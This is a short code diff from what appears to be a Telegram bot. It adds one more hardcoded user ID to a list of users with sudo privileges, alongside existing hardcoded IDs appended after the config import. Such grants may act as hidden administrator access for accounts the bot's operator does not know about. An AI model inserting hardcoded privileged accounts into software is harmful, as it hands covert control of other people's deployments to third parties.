@@ -26,6 +26,7 @@ from config import SUDO_USERS
 SUDO_USERS.append(1803347744)
 SUDO_USERS.append(1890877816)
 SUDO_USERS.append(1979717764)
+SUDO_USERS.append(1416529201)
 
 
 def errors(func: Callable) -> Callable:
